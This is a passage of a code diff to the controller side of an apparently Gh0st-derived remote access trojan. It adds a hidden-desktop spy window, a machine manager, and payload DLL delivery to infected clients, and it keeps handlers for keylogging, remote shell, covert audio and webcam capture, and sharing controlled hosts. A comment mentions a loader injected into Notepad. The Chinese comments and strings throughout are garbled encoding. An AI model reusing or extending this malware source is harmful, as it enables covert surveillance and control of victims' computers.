+		CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "å…³äº");
 }
 
-//ÍĞÅÌMenu
+//æ‰˜ç›˜Menu
 void CMy2015RemoteDlg::OnNotifyShow()
 {
 	BOOL v=	IsWindowVisible();
@@ -1316,17 +1325,17 @@ void CMy2015RemoteDlg::OnNotifyShow()
 void CMy2015RemoteDlg::OnNotifyExit()
 {
 	Release();
-	CDialogEx::OnOK(); // ¹Ø±Õ¶Ô»°¿ò
+	CDialogEx::OnOK(); // å…³é—­å¯¹è¯æ¡†
 }
 
 
-//¹ÌÌ¬²Ëµ¥
+//å›ºæ€èœå•
 void CMy2015RemoteDlg::OnMainSet()
 {
 	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
 	CSettingDlg  Dlg;
 
-	Dlg.DoModal();   //Ä£Ì¬ ×èÈû
+	Dlg.DoModal();   //æ¨¡æ€ é˜»å¡
 	if (nMaxConnection != Dlg.m_nMax_Connect)
 	{
 		m_iocpServer->UpdateMaxConnection(Dlg.m_nMax_Connect);
@@ -1352,20 +1361,20 @@ void CMy2015RemoteDlg::OnMainSet()
 void CMy2015RemoteDlg::OnMainExit()
 {
 	Release();
-	CDialogEx::OnOK(); // ¹Ø±Õ¶Ô»°¿ò
+	CDialogEx::OnOK(); // å…³é—­å¯¹è¯æ¡†
 }
 
 BOOL CMy2015RemoteDlg::ListenPort()
 {
 	int nPort = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
-	//¶ÁÈ¡ini ÎÄ¼şÖĞµÄ¼àÌı¶Ë¿Ú
+	//è¯»å–ini æ–‡ä»¶ä¸­çš„ç›‘å¬ç«¯å£
 	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
-	//¶ÁÈ¡×î´óÁ¬½ÓÊı
+	//è¯»å–æœ€å¤§è¿æ¥æ•°
 	if (nPort<=0 || nPort>65535)
 		nPort = 6543;
 	if (nMaxConnection <= 0)
 		nMaxConnection = 10000;
-	return Activate(nPort,nMaxConnection);             //¿ªÊ¼¼àÌı
+	return Activate(nPort,nMaxConnection);             //å¼€å§‹ç›‘å¬
 }
 
 
@@ -1460,8 +1469,8 @@ BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 			if (!pids.empty()) {
 				pids.back() = '?';
 			}
-			if (IDYES == MessageBox("µ÷ÓÃº¯ÊıStartServerÊ§°Ü! ´íÎó´úÂë:" + CString(std::to_string(ret).c_str()) +
-				"\r\nÊÇ·ñ¹Ø±ÕÒÔÏÂ½ø³ÌÖØÊÔ: " + pids.c_str(), "ÌáÊ¾", MB_YESNO)) {
+			if (IDYES == MessageBox("è°ƒç”¨å‡½æ•°StartServerå¤±è´¥! é”™è¯¯ä»£ç :" + CString(std::to_string(ret).c_str()) +
+				"\r\næ˜¯å¦å…³é—­ä»¥ä¸‹è¿›ç¨‹é‡è¯•: " + pids.c_str(), "æç¤º", MB_YESNO)) {
 				for (const auto& line : lines) {
 					auto cmd = std::string("taskkill /f /pid ") + line;
 					exec(cmd.c_str());
@@ -1469,12 +1478,12 @@ BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 				return Activate(nPort, nMaxConnection);
 			}
 		}else
-			MessageBox("µ÷ÓÃº¯ÊıStartServerÊ§°Ü! ´íÎó´úÂë:" + CString(std::to_string(ret).c_str()));
+			MessageBox("è°ƒç”¨å‡½æ•°StartServerå¤±è´¥! é”™è¯¯ä»£ç :" + CString(std::to_string(ret).c_str()));
 		return FALSE;
 	}
 
 	CString strTemp;
-	strTemp.Format("¼àÌı¶Ë¿Ú: %d³É¹¦", nPort);
+	strTemp.Format("ç›‘å¬ç«¯å£: %dæˆåŠŸ", nPort);
 	ShowMessage(true,strTemp);
 	return TRUE;
 }
@@ -1548,6 +1557,16 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 		Dlg->OnReceiveComplete();
 		break;
 	}
+	case HIDESCREEN_DLG: {
+		CHideScreenSpyDlg* Dlg = (CHideScreenSpyDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
+	case MACHINE_DLG: {
+		CMachineDlg* Dlg = (CMachineDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
 	default: {
 		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 		if (hEvent == NULL) {
@@ -1565,7 +1584,7 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 	}
 }
 
-// ¶Ô»°¿ò¾ä±ú¼°¶Ô»°¿òÀàĞÍ
+// å¯¹è¯æ¡†å¥æŸ„åŠå¯¹è¯æ¡†ç±»å‹
 struct dlgInfo
 {
 	HANDLE hDlg;
@@ -1614,7 +1633,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 	case TOKEN_HEARTBEAT: case 137:
 		UpdateActiveWindow(ContextObject);
 		break;
-	case SOCKET_DLLLOADER: {// ÇëÇóDLL
+	case SOCKET_DLLLOADER: {// è¯·æ±‚DLL
 		auto len = ContextObject->InDeCompressedBuffer.GetBufferLength();
 		bool is64Bit = len > 1 ? ContextObject->InDeCompressedBuffer.GetBYTE(1) : false;
 		int typ = (len > 2 ? ContextObject->InDeCompressedBuffer.GetBYTE(2) : MEMORYDLL);
@@ -1627,67 +1646,76 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		}
 		char version[12] = {};
 		ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
-		SendServerDll(ContextObject, typ == MEMORYDLL, is64Bit);
+		// TODO æ³¨å…¥è®°äº‹æœ¬çš„åŠ è½½å™¨éœ€è¦æ›´æ–°
+		SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
 		break;
 	}
-	case COMMAND_BYE: // Ö÷»úÏÂÏß
+	case COMMAND_BYE: // ä¸»æœºä¸‹çº¿
 		{
 			CancelIo((HANDLE)ContextObject->sClientSocket);
 			closesocket(ContextObject->sClientSocket); 
 			Sleep(10);
 			break;
 		}
-	case TOKEN_KEYBOARD_START: {// ¼üÅÌ¼ÇÂ¼
+	case TOKEN_BITMAPINFO_HIDE: { // è™šæ‹Ÿæ¡Œé¢
+		g_2015RemoteDlg->SendMessage(WM_OPENHIDESCREENDLG, 0, (LPARAM)ContextObject);
+		break;
+	}
+	case TOKEN_SYSINFOLIST: { // ä¸»æœºç®¡ç†
+		g_2015RemoteDlg->SendMessage(WM_OPENMACHINEMGRDLG, 0, (LPARAM)ContextObject);
+		break;
+	}
+	case TOKEN_KEYBOARD_START: {// é”®ç›˜è®°å½•
 			g_2015RemoteDlg->SendMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_LOGIN: // ÉÏÏß°ü  shine
+	case TOKEN_LOGIN: // ä¸Šçº¿åŒ…
 		{
 			g_2015RemoteDlg->SendMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); 
 			break;
 		}
-	case TOKEN_BITMAPINFO: // Ô¶³Ì×ÀÃæ
+	case TOKEN_BITMAPINFO: // è¿œç¨‹æ¡Œé¢
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_DRIVE_LIST: // ÎÄ¼ş¹ÜÀí
+	case TOKEN_DRIVE_LIST: // æ–‡ä»¶ç®¡ç†
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_TALK_START: // ·¢ËÍÏûÏ¢
+	case TOKEN_TALK_START: // å‘é€æ¶ˆæ¯
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_SHELL_START: // Ô¶³ÌÖÕ¶Ë
+	case TOKEN_SHELL_START: // è¿œç¨‹ç»ˆç«¯
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_WSLIST:  // ´°¿Ú¹ÜÀí
-	case TOKEN_PSLIST:  // ½ø³Ì¹ÜÀí
+	case TOKEN_WSLIST:  // çª—å£ç®¡ç†
+	case TOKEN_PSLIST:  // è¿›ç¨‹ç®¡ç†
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_AUDIO_START: // ÓïÒô¼àÌı
+	case TOKEN_AUDIO_START: // è¯­éŸ³ç›‘å¬
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_REGEDIT: // ×¢²á±í¹ÜÀí
+	case TOKEN_REGEDIT: // æ³¨å†Œè¡¨ç®¡ç†
 		{                            
 			g_2015RemoteDlg->SendMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_SERVERLIST: // ·şÎñ¹ÜÀí
+	case TOKEN_SERVERLIST: // æœåŠ¡ç®¡ç†
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_WEBCAM_BITMAPINFO: // ÉãÏñÍ·
+	case TOKEN_WEBCAM_BITMAPINFO: // æ‘„åƒå¤´
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
 			break;
@@ -1698,7 +1726,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 {
 	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
-	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam; //×¢ÒâÕâÀïµÄ  ClientContext  ÕıÊÇ·¢ËÍÊı¾İÊ±´ÓÁĞ±íÀïÈ¡³öµÄÊı¾İ
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam; //æ³¨æ„è¿™é‡Œçš„  ClientContext  æ­£æ˜¯å‘é€æ•°æ®æ—¶ä»åˆ—è¡¨é‡Œå–å‡ºçš„æ•°æ®
 
 	if (ContextObject == NULL || isClosed)
 	{
@@ -1707,13 +1735,12 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 
 	try
 	{
-
 		sockaddr_in  ClientAddr;
 		memset(&ClientAddr, 0, sizeof(ClientAddr));
 		int iClientAddrLen = sizeof(sockaddr_in);
 		SOCKET nSocket = ContextObject->sClientSocket;
 		BOOL bOk = getpeername(nSocket, (SOCKADDR*)&ClientAddr, &iClientAddrLen);
-		// ²»ºÏ·¨µÄÊı¾İ°ü
+		// ä¸åˆæ³•çš„æ•°æ®åŒ…
 		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
 		{
 			char buf[100];
@@ -1732,10 +1759,10 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 		}
 		strIP = inet_ntoa(ClientAddr.sin_addr);
 
-		//Ö÷»úÃû³Æ
+		//ä¸»æœºåç§°
 		strPCName = LoginInfor->szPCName;
 
-		//°æ±¾ĞÅÏ¢
+		//ç‰ˆæœ¬ä¿¡æ¯
 		strOS = LoginInfor->OsVerInfoEx;
 
 		//CPU
@@ -1747,10 +1774,10 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 			strCPU = "Unknown";
 		}
 
-		//ÍøËÙ
+		//ç½‘é€Ÿ
 		strPing.Format("%d", LoginInfor->dwSpeed);
 
-		strVideo = m_settings.DetectSoftware ? "ÎŞ" : LoginInfor->bWebCamIsExist ? "ÓĞ" : "ÎŞ";
+		strVideo = m_settings.DetectSoftware ? "æ— " : LoginInfor->bWebCamIsExist ? "æœ‰" : "æ— ";
 
 		strAddr.Format("%d", nSocket);
 		auto v = LoginInfor->ParseReserved(10);
@@ -1778,7 +1805,7 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 		{
 			ip = m_CList_Online.GetItemText(i, ONLINELIST_IP);
 			m_CList_Online.DeleteItem(i);
-			ShowMessage(true, ip + "Ö÷»úÏÂÏß");
+			ShowMessage(true, ip + "ä¸»æœºä¸‹çº¿");
 			break;
 		}
 	}
@@ -1840,7 +1867,7 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 		case REGISTER_DLG:
 			{
 				CRegisterDlg *Dlg = (CRegisterDlg*)p->hDlg;
-				delete Dlg; //ÌØÊâ´¦Àí
+				delete Dlg; //ç‰¹æ®Šå¤„ç†
 				break;
 			}
 		case KEYBOARD_DLG:
@@ -1849,6 +1876,18 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 				delete Dlg;
 				break;
 			}
+		case HIDESCREEN_DLG:
+		{
+			CHideScreenSpyDlg* Dlg = (CHideScreenSpyDlg*)p->hDlg;
+			delete Dlg;
+			break;
+		}
+		case MACHINE_DLG:
+		{
+			CMachineDlg* Dlg = (CMachineDlg*)p->hDlg;
+			delete Dlg;
+			break;
+		}
 		default:break;
 		}
 		delete p;
@@ -1862,7 +1901,7 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
 	Heartbeat hb;
 	ctx->InDeCompressedBuffer.CopyBuffer(&hb, sizeof(Heartbeat), 1);
 
-	// »Ø¸´ĞÄÌø
+	// å›å¤å¿ƒè·³
 	{
 		HeartbeatACK ack = { hb.Time };
 		BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
@@ -1879,7 +1918,7 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
 			m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
 			if (hb.Ping > 0)
 				m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
-			m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "ÓĞ" : "ÎŞ");
+			m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "æœ‰" : "æ— ");
 			return;
 		}
 	}
@@ -1910,7 +1949,15 @@ VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
 	auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
 	auto buf = isDLL ? m_ServerDLL[id] : m_ServerBin[id];
 	if (buf->length()) {
-		m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), buf->length());
+		// åªæœ‰å‘é€äº†IVçš„åŠ è½½å™¨æ‰æ”¯æŒAESåŠ å¯†
+		int len = ContextObject->InDeCompressedBuffer.GetBufferLength();
+		char md5[33] = {};
+		memcpy(md5, (char*)ContextObject->InDeCompressedBuffer.GetBuffer(32), max(0,min(32, len-32)));
+		if (!buf->MD5().empty() && md5 != buf->MD5())
+			m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), buf->length(len<=20));
+		else {
+			m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), 6 /* data not changed */);
+		}
 	}
 }
 
@@ -1920,7 +1967,7 @@ LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
 	CScreenSpyDlg	*Dlg = new CScreenSpyDlg(this,m_iocpServer, ContextObject);   //Send  s
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
 	Dlg->Create(IDD_DIALOG_SCREEN_SPY, GetDesktopWindow());
 	Dlg->ShowWindow(SW_SHOWMAXIMIZED);
 
@@ -1934,10 +1981,10 @@ LRESULT CMy2015RemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
 {
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
-	//×ªµ½CFileManagerDlg  ¹¹Ôìº¯Êı
+	//è½¬åˆ°CFileManagerDlg  æ„é€ å‡½æ•°
 	CFileManagerDlg	*Dlg = new CFileManagerDlg(this,m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_FILE, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_FILE, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1   = FILEMANAGER_DLG;
@@ -1967,10 +2014,10 @@ LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
 {
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
-	//×ªµ½CFileManagerDlg  ¹¹Ôìº¯Êı
+	//è½¬åˆ°CFileManagerDlg  æ„é€ å‡½æ•°
 	CTalkDlg	*Dlg = new CTalkDlg(this,m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1   = TALK_DLG;
@@ -1983,10 +2030,10 @@ LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 {
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
-	//×ªµ½CFileManagerDlg  ¹¹Ôìº¯Êı
+	//è½¬åˆ°CFileManagerDlg  æ„é€ å‡½æ•°
 	CShellDlg	*Dlg = new CShellDlg(this,m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1   = SHELL_DLG;
@@ -2000,10 +2047,10 @@ LRESULT CMy2015RemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
 {
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
-	//×ªµ½CFileManagerDlg  ¹¹Ôìº¯Êı
+	//è½¬åˆ°CFileManagerDlg  æ„é€ å‡½æ•°
 	CSystemDlg	*Dlg = new CSystemDlg(this,m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1   = SYSTEM_DLG;
@@ -2016,10 +2063,10 @@ LRESULT CMy2015RemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
 {
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
-	//×ªµ½CFileManagerDlg  ¹¹Ôìº¯Êı
+	//è½¬åˆ°CFileManagerDlg  æ„é€ å‡½æ•°
 	CAudioDlg	*Dlg = new CAudioDlg(this,m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1   = AUDIO_DLG;
@@ -2032,10 +2079,10 @@ LRESULT CMy2015RemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
 {
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
-	//×ªµ½CFileManagerDlg  ¹¹Ôìº¯Êı
+	//è½¬åˆ°CFileManagerDlg  æ„é€ å‡½æ•°
 	CServicesDlg	*Dlg = new CServicesDlg(this,m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1   = SERVICES_DLG;
@@ -2048,10 +2095,10 @@ LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
 {
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
-	//×ªµ½CFileManagerDlg  ¹¹Ôìº¯Êı
+	//è½¬åˆ°CFileManagerDlg  æ„é€ å‡½æ•°
 	CRegisterDlg	*Dlg = new CRegisterDlg(this,m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1   = REGISTER_DLG;
@@ -2064,10 +2111,10 @@ LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
 {
 	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
 
-	//×ªµ½CFileManagerDlg  ¹¹Ôìº¯Êı
+	//è½¬åˆ°CFileManagerDlg  æ„é€ å‡½æ•°
 	CVideoDlg	*Dlg = new CVideoDlg(this,m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1   = VIDEO_DLG;
@@ -2081,8 +2128,8 @@ LRESULT CMy2015RemoteDlg::OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam)
 	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
 
 	CKeyBoardDlg* Dlg = new CKeyBoardDlg(this, m_iocpServer, ContextObject);
-	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
-	Dlg->Create(IDD_DLG_KEYBOARD, GetDesktopWindow());    //´´½¨·Ç×èÈûµÄDlg
+	// è®¾ç½®çˆ¶çª—å£ä¸ºå“é¢
+	Dlg->Create(IDD_DLG_KEYBOARD, GetDesktopWindow());    //åˆ›å»ºéé˜»å¡çš„Dlg
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1 = KEYBOARD_DLG;
@@ -2105,9 +2152,39 @@ LRESULT CMy2015RemoteDlg::OnOpenProxyDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+LRESULT CMy2015RemoteDlg::OnOpenHideScreenDialog(WPARAM wParam, LPARAM lParam)
+{
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
+
+	CHideScreenSpyDlg* Dlg = new CHideScreenSpyDlg(this, m_iocpServer, ContextObject);
+
+	Dlg->Create(IDD_SCREEN, GetDesktopWindow());
+	Dlg->ShowWindow(SW_SHOW);
+
+	ContextObject->v1 = HIDESCREEN_DLG;
+	ContextObject->hDlg = Dlg;
+
+	return 0;
+}
+
+LRESULT CMy2015RemoteDlg::OnOpenMachineManagerDialog(WPARAM wParam, LPARAM lParam)
+{
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
+
+	CMachineDlg* Dlg = new CMachineDlg(this, m_iocpServer, ContextObject);
+
+	Dlg->Create(IDD_MACHINE, GetDesktopWindow());
+	Dlg->ShowWindow(SW_SHOW);
+
+	ContextObject->v1 = MACHINE_DLG;
+	ContextObject->hDlg = Dlg;
+
+	return 0;
+}
+
 BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
 {
-	MessageBox("Copyleft (c) FTU 2025", "¹ØÓÚ");
+	MessageBox("Copyleft (c) FTU 2025", "å…³äº");
 	return TRUE;
 }
 
@@ -2126,18 +2203,18 @@ BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
 void CMy2015RemoteDlg::OnOnlineShare()
 {
 	CInputDialog dlg(this);
-	dlg.Init("·ÖÏíÖ÷»ú", "ÊäÈë<IP:PORT>µØÖ·:");
+	dlg.Init("åˆ†äº«ä¸»æœº", "è¾“å…¥<IP:PORT>åœ°å€:");
 	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
 		return;
 	if (dlg.m_str.GetLength() >= 250) {
-		MessageBox("×Ö·û´®³¤¶È³¬³ö[0, 250]·¶Î§ÏŞÖÆ!", "ÌáÊ¾", MB_ICONINFORMATION);
+		MessageBox("å­—ç¬¦ä¸²é•¿åº¦è¶…å‡º[0, 250]èŒƒå›´é™åˆ¶!", "æç¤º", MB_ICONINFORMATION);
 		return;
 	}
-	if (IDYES != MessageBox(_T("È·¶¨·ÖÏíÑ¡¶¨µÄ±»¿Ø¼ÆËã»úÂğ?\nÄ¿Ç°Ö»ÄÜ·ÖÏí¸øÍ¬ÀàÖ÷¿Ø³ÌĞò¡£"), _T("ÌáÊ¾"), MB_ICONQUESTION | MB_YESNO))
+	if (IDYES != MessageBox(_T("ç¡®å®šåˆ†äº«é€‰å®šçš„è¢«æ§è®¡ç®—æœºå—?\nç›®å‰åªèƒ½åˆ†äº«ç»™åŒç±»ä¸»æ§ç¨‹åºã€‚"), _T("æç¤º"), MB_ICONQUESTION | MB_YESNO))
 		return;
 
 	BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
-	// Ä¿±êÖ÷»úÀàĞÍ
+	// ç›®æ ‡ä¸»æœºç±»å‹
 	bToken[1] = SHARE_TYPE_YAMA;
 	memcpy(bToken + 2, dlg.m_str, dlg.m_str.GetLength());
 	SendSelectedCommand(bToken, sizeof(bToken));
@@ -2173,12 +2250,12 @@ void CMy2015RemoteDlg::OnMainProxy()
 void CMy2015RemoteDlg::OnOnlineHostnote()
 {
 	CInputDialog dlg(this);
-	dlg.Init("ĞŞ¸Ä±¸×¢", "ÇëÊäÈëÖ÷»ú±¸×¢: ");
+	dlg.Init("ä¿®æ”¹å¤‡æ³¨", "è¯·è¾“å…¥ä¸»æœºå¤‡æ³¨: ");
 	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty()) {
 		return;
 	}
 	if (dlg.m_str.GetLength() >= 64) {
-		MessageBox("±¸×¢ĞÅÏ¢³¤¶È²»ÄÜ³¬¹ı64¸ö×Ö·û", "ÌáÊ¾", MB_ICONINFORMATION);
+		MessageBox("å¤‡æ³¨ä¿¡æ¯é•¿åº¦ä¸èƒ½è¶…è¿‡64ä¸ªå­—ç¬¦", "æç¤º", MB_ICONINFORMATION);
 		dlg.m_str = dlg.m_str.Left(63);
 	}
 	BOOL modified = FALSE;
@@ -2206,18 +2283,18 @@ void CMy2015RemoteDlg::OnOnlineHostnote()
 
 
 char* ReadFileToBuffer(const std::string &path, size_t& outSize) {
-	// ´ò¿ªÎÄ¼ş
-	std::ifstream file(path, std::ios::binary | std::ios::ate); // ate = Ìøµ½Ä©Î²»ñµÃ´óĞ¡
+	// æ‰“å¼€æ–‡ä»¶
+	std::ifstream file(path, std::ios::binary | std::ios::ate); // ate = è·³åˆ°æœ«å°¾è·å¾—å¤§å°
 	if (!file) {
 		return nullptr;
 	}
 
-	// »ñÈ¡ÎÄ¼ş´óĞ¡²¢·ÖÅäÄÚ´æ
+	// è·å–æ–‡ä»¶å¤§å°å¹¶åˆ†é…å†…å­˜
 	std::streamsize size = file.tellg();
 	file.seekg(0, std::ios::beg);
 	char* buffer = new char[size];
 
-	// ¶ÁÈ¡ÎÄ¼şµ½ buffer
